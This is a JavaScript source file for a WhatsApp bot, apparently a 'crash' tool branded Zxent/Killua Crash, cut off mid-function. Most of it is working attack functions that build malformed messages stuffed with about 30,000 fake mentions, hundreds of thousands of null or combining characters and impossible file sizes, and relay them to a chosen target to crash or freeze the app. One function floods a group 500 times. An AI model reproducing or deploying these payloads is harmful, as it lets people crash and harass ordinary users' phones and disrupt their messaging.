const crypto = require("crypto")

module.exports = async (client, m, store) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ""
	
const budy = (typeof m.text == 'string' ? m.text : '') 
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await client.decodeJid(client.user.id)
const murbug = JSON.parse(fs.readFileSync("./data/murbug.json"))
const isMurbug = murbug.includes(m.sender)
const isOwner = m.sender.split("@")[0] == global.owner ? true : m.fromMe ? true : false
const pushname = m.pushName || `${m.sender.split("@")[0]}`
const isBot = botNumber.includes(m.sender)
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, resize, sleep } = require('./lib/function.js')

m.isGroup = m.chat.endsWith("g.us")
m.metadata = m.isGroup ? (await client.groupMetadata(m.chat).catch(_ => {}) || {}) : {}
m.isAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == m.sender) || false) : false
m.isBotAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == botNumber) || false) : false

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(BotName), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`FROM`), chalk.blue.bold(`${m.sender.split("@")[0]}`), chalk.blue.bold(`TEXT :`), chalk.blue.bold(`${cmd}`))
}

// ===== !! FAKE QUOTED !! ===== \\

const qchannel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `${IDch}`, newsletterName: `Manzy Channel`, jpegThumbnail: "", caption: `Zxent Crash Version 1`, inviteExpiration: 0 }}}

// ===== !! END FAKE QUOTED !! ===== \\

// ===== !! FUNCTION !! ===== \\
async function protocolbug5(manz, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(manz, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [manz],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: manz }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await manz.relayMessage(manz, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function ZxentCrash3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u200D".repeat(1000),
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            target, "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

    
    
    async function ZxentCrash2(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "Come here kiddo - AmbaCrash",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "@ZxentCrash" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
    
async function ZxentCrash1(target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@KilluaCrashnibos",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await client.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await client.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 𝐊𝐢𝐥𝐥𝐮𝐚 - 𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 2" },
content: undefined
}
]
}
);
}
}

async function CursorimgDoc(target) {
const buttons = [
{ buttonId: "\u0000".repeat(299999), buttonText: { displayText: "Haii?" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }, 
{
buttonId: "\u0000", 
buttonText: { displayText: '𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎' }, 
type: 1, 
nativeFlowInfo: { 
name: '𝐙𝐱𝐞𝐧𝐭𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 2.𝟎𝘆',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(220000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 2 
}
}
];
let messagePayload = {
viewOnceMessage: {
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"caption": "𝗡𝗶𝗸𝗮𝗩𝗲𝗿𝘀𝗶𝗼𝗻𝟱𝗙𝗿" + "\u0000".repeat(199) + "ꦾ".repeat(15999), 
"fileSha256": "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
"fileLength": "99999999999",
"height": 307,
"width": 734,
"mediaKey": "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
"fileEncSha256": "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
"directPath": "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1738686532",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
"scansSidecar": "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
"scanLengths": [
2226,
6362,
4102,
6420
],
"midQualityFileSha256": "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA=", 
contextInfo: {
virtexId: client.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: [target, "0@s.whatsapp.net"],
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "𝗦𝘂𝗻𝗚𝗼𝗱𝗡𝗶𝗸𝗮",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
mediaKeyTimestamp: "1735456100",
caption: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.0"
},
hasMediaAttachment: true,
contentText: "𝗡𝗶𝗸𝗮",
footerText: "Why?",
buttons: buttons, 
viewOnce: true,
headerType: 3
}
}, 
isForwarded: true,
actionLink: {
url: "t.me/joomodz",
buttonTitle: "𝗖𝘂𝗿𝘀𝗼𝗿𝗶𝗺𝗴 𝗕𝘂𝗴"
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363409362506610@newsletter",
serverMessageId: 1,
newsletterName: `𝗡𝗶𝗸𝗮𝗩𝗲𝗿𝘀𝗶𝗼𝗻𝟱${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
}
}
}
}
}
};
await client.relayMessage(target, messagePayload, {
messageId: client.generateMessageTag(), 
participant: { jid : target }
});
}
async function JustinXFlowButton(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 1,
          },
          interactiveMessage: {
            contextInfo: {
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              participant: target,
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: `33333333333333333@newsletter`,
                newsletterName: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎",
                businessOwnerJid: target,
              },
            },
            body: {
              text: "𝗡𝗶𝗸𝗮𝗩𝗲𝗿𝘀𝗶𝗼𝗻𝟱𝗳",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "galaxy_message",
                  paramsJson: {
                    screen_2_OptIn_0: true,
                    screen_2_OptIn_1: true,
                    screen_1_Dropdown_0: "nullOnTop",
                    screen_1_DatePicker_1: "1028995200000",
                    screen_1_TextInput_2: "null@gmail.com",
                    screen_1_TextInput_3: "94643116",
                    screen_0_TextInput_0: "\u0000".repeat(500000),
                    screen_0_TextInput_1: "SecretDocu",
                    screen_0_Dropdown_2: "#926-Xnull",
                    screen_0_RadioButtonsGroup_3: "0_true",
                    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                  },
                },
              ],
            },
          },
        },
      },
    };

    await client.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function Crashed(target) {
client.relayMessage(
target,
{
interactiveMessage: {
header: {
title: "⃟🩸𝗡𝗶𝗸𝗮𝗮̈́ 🦠⃟   ",
hasMediaAttachment: false
},
body: {
text: "\nꦾ".repeat(155555)
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [{
name: "single_select",
buttonParamsJson: "z"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},
{
name: "form_message",
buttonParamsJson: "{}"
},

]
}
}						
},
{ participant: { jid: target } }
);
}
async function AnakKucai(target, Ptcp = true) {
  try {
    await client.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 999.03499999999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "—𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎\n" + "ꦾ".repeat(30000) +
                  "\u0000".repeat(10000) +
                  "@22222".repeat(20000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "0@newsletter",
                    groupSubject: "SiJomokKenapaJirr",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

const MessageBug = async (target) => {
  return client.sendMessage(target, {
    mimetype: "𝗨𝗜 𝗕𝘂𝗴", 
    fileName: "𝗞𝗶𝗹𝗹𝗶𝗻𝗴 𝗚𝗿𝗼𝘂𝗽.zip", 
    fileLength: 99999999999, 
    caption: `☠️𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎 𝐊𝐢𝐥𝐥𝐢𝐧𝐠 𝐆𝐫𝐨𝐮𝐩🗡                                                                                                                                                                                                                                                ${teksbug2}`
  }, {quoted: qkontak});
}

async function gcriper(client, target) {
    if (!target.includes("@s.whatsapp.net") && !target.includes("@g.us")) {
        console.error("Error: Target JID tidak valid!", target);
        return;
    }

    let Msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "*NikaaV5f*",
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: "" },
                            { name: "call_permission_request", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                            { name: "mpm", buttonParamsJson: "" },
                        ],
                    },
                },
            },
        },
    };

    for (let i = 0; i < 500; i++) {  
        try {
            await client.relayMessage(target, Msg, {});
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (err) {
            console.error("Error mengirim bug:", err);
            break; 
        }
    }
}

async function CrashJids(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await client.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function NotifKill(client, target) {
      client.relayMessage(target, {
          extendedTextMessage: {
            text: `\u0000` + "ꦽ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: client.generateMessageTag(),
              participant: target,
              quotedMessage: {
                conversation: "\u0000" + "ꦽ".repeat(90000),
              },
              disappearingMode: {
                initiator: 1,
                trigger: 2,
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        }, { participant: { jid: target },
        },
        {
          messageId: null,
        }
      );
    console.log("\x1b[33m%s\x1b[0m", `Successfully Sent Ui System Bug`);
    }
   
    
async function trashinfinity(target) {
 let virtex = "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎";
   client.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
